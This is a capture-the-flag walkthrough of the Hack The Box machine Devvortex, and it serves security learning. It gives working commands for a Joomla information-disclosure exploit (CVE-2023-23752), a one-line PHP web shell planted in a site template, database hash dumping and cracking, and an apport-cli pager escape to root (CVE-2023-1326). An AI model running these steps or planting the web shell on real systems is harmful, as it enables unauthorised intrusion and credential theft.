# Devvortex — Hack The Box

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Easy |

| **IP** | `10.129.82.173` |
## Synopsis

Devvortex is an easy Linux machine. Virtual-host fuzzing uncovers `dev.devvortex.htb`, which
runs **Joomla**. The version is vulnerable to **CVE-2023-23752**, an unauthenticated API
information-disclosure flaw that leaks the database credentials from the Joomla configuration.
Those credentials log in to the Joomla administrator panel, where the site template's PHP is
edited to achieve **RCE** as `www-data`. The MySQL database holds the `logan` user's bcrypt
hash, which is cracked and reused for SSH. Finally, `logan` may run **apport-cli** as root via
sudo, and **CVE-2023-1326** (a pager escape in apport-cli) is used to get a root shell.

---

## Enumeration

### Nmap

```bash
nmap -p- --min-rate=5000 -T4 10.129.82.173
nmap -p22,80 -sCV 10.129.82.173
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1
80/tcp open  http    nginx 1.18.0 (redirects to devvortex.htb)
```

Add `devvortex.htb` to `/etc/hosts`.

### Virtual host discovery

The main site is a static brochure. Fuzz for sub-domains:

```bash
ffuf -u http://devvortex.htb -w <subdomains.txt> -H "Host: FUZZ.devvortex.htb" -fs 154
```

This reveals **`dev.devvortex.htb`** — add it to `/etc/hosts`. The dev host runs Joomla
(confirmed via `/administrator`, `README.txt`, and `/api/index.php`).

---

## Foothold

### CVE-2023-23752 — Joomla information disclosure

Unauthenticated access to the Joomla web-service API leaks configuration, including DB
credentials:

```bash
curl -s "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true" | jq
```

The response discloses `user`, `password`, `db`, and host for the Joomla database — the
password belongs to the Joomla admin user `lewis`.

### Admin panel → template RCE

Log in to `http://dev.devvortex.htb/administrator` as **lewis**. Navigate to
**System → Site Templates → Cassiopeia** and edit a template file (e.g. `error.php`) to add a
PHP web shell:

```php
<?php system($_GET['cmd']); ?>
```

Save, then trigger it and launch a reverse shell:

```bash
curl "http://dev.devvortex.htb/templates/cassiopeia/error.php?cmd=id"
# bash reverse shell to your listener
```

Shell lands as **www-data**.

### Cracking logan's hash

Dump the Joomla users table from MySQL with lewis's DB credentials:

```bash
mysql -u lewis -p -e "SELECT username,password FROM joomla.sd4fg_users;"
```

Crack logan's bcrypt hash:

```bash
hashcat -m 3200 logan.hash /usr/share/wordlists/rockyou.txt
```

SSH in with the recovered password:

```bash
ssh logan@devvortex.htb
```

The **user flag** is in `/home/logan/user.txt`.

---

## Privilege Escalation — apport-cli (CVE-2023-1326)

Check sudo rights:

```bash
sudo -l
# (ALL : ALL) /usr/bin/apport-cli
```

`apport-cli` pipes output through a pager (`less`). When viewing a crash report as root, the
pager can be escaped to a shell — this is **CVE-2023-1326**:

```bash
sudo /usr/bin/apport-cli -c <crash-file>    # or -f to file a bug / view a report
# choose the option that displays the report ("V" / view)
# at the less pager prompt:
!/bin/bash
```

```
root@devvortex:~# id
uid=0(root) gid=0(root) groups=0(root)
```

The **root flag** is at `/root/root.txt`.
